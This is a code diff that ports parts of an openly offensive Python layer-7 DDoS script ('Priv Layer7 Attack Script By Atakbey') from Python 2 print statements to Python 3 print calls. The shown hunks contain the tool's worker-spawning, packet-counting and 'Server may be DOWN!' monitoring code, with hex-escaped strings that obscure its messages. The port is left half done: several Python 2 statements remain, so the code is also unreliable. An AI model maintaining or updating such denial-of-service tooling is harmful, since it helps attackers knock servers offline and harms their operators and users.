@@ -46,22 +46,22 @@ class R00T(object):
 
     def exit(self):
         self.stats()
-        print "DOWN!!!"
+        print("DOWN!!!")
 
     def __del__(self):
         self.exit()
 
     def printHeader(self):
 
-        print "DDoS SaLdirisi BasLatiLdi.."
-        print "CoDeD By Atakbey"
+        print("DDoS SaLdirisi BasLatiLdi..")
+        print("CoDeD By Atakbey")
     def fire(self):
 
         self.printHeader()
         print "\x4D\x65\x74\x68\x6F\x64\x3A\x20\x7B0\x7D\x20\x2F\x20\x53\x61\x79\x69\x73\x69\x3A\x20\x7B\x31\x7D\x20\x2F\x20\x53\x6F\x63\x6B\x65\x64\x3A\x20\x7B\x32\x7D\x20".format(self.method, self.nr_workers, self.nr_sockets)
 
         if DEBUG:
-            print "\x44\x65\x62\x75\x67\x20\x4D\x6F\x64\x65\x73\x20\x4F\x4E\x20\x4D\x65\x74\x68\x6F\x64\x3A\x20\x7B0\x7D\x20".format(self.nr_workers)
+            print("\x44\x65\x62\x75\x67\x20\x4D\x6F\x64\x65\x73\x20\x4F\x4E\x20\x4D\x65\x74\x68\x6F\x64\x3A\x20\x7B0\x7D\x20".format(self.nr_workers))
 
         for i in range(int(self.nr_workers)):
 
@@ -76,7 +76,7 @@ class R00T(object):
                 error("\x53\x61\x79\x69\x20\x42\x61\x73\x6C\x61\x74\x69\x6C\x61\x6D\x61\x64\x69\x20\x7B0\x7D".format(i))
                 pass 
 
-        print "\x4D\x6F\x6E\x69\x74\x6F\x72\x20\x62\x61\x73\x6C\x61\x74\x69\x6C\x69\x79\x6F\x72"
+        print("\x4D\x6F\x6E\x69\x74\x6F\x72\x20\x62\x61\x73\x6C\x61\x74\x69\x6C\x69\x79\x6F\x72")
         self.monitor()
 
     def stats(self):
@@ -84,10 +84,10 @@ class R00T(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print "\x59\x65\x64\x69\x67\x69\x20\x50\x61\x6B\x65\x74\x73\x3A\x20\x7B0\x7D\x20\x44\x44\x6F\x53\x65\x44\x20\x28\x7B\x31\x7D\x20\x47\x47\x29".format(self.counter[0], self.counter[1])
+                print("\x59\x65\x64\x69\x67\x69\x20\x50\x61\x6B\x65\x74\x73\x3A\x20\x7B0\x7D\x20\x44\x44\x6F\x53\x65\x44\x20\x28\x7B\x31\x7D\x20\x47\x47\x29".format(self.counter[0], self.counter[1]))
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
-                    print "Server may be DOWN! By atak.pl"
+                    print("Server may be DOWN! By atak.pl")
     
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
@@ -106,11 +106,11 @@ class R00T(object):
                 self.stats()
 
             except (KeyboardInterrupt, SystemExit):
-                print "\x43\x54\x52\x4C\x2B\x43\x20\x72\x65\x63\x65\x69\x76\x65\x64\x2E\x20\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x61\x6C\x6C\x20\x77\x6F\x72\x6B\x65\x72\x73"
+                print("\x43\x54\x52\x4C\x2B\x43\x20\x72\x65\x63\x65\x69\x76\x65\x64\x2E\x20\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x61\x6C\x6C\x20\x77\x6F\x72\x6B\x65\x72\x73")
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print "\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x77\x6F\x72\x6B\x65\x72\x20\x7B0\x7D".format(worker.name)
+                            print("\x4B\x69\x6C\x6C\x69\x6E\x67\x20\x77\x6F\x72\x6B\x65\x72\x20\x7B0\x7D".format(worker.name))
                         worker.stop()
                     except Exception, ex:
                         pass 
@@ -382,10 +382,9 @@ class Laser(Process):
 
 def usage():
     print
-    print ""
-    print "Priv Layer7 Attack Script By Atakbey"
-    print
-    print ""
+    print("")
+    print("Priv Layer7 Attack Script By Atakbey")
+    print ("")
 
 
     
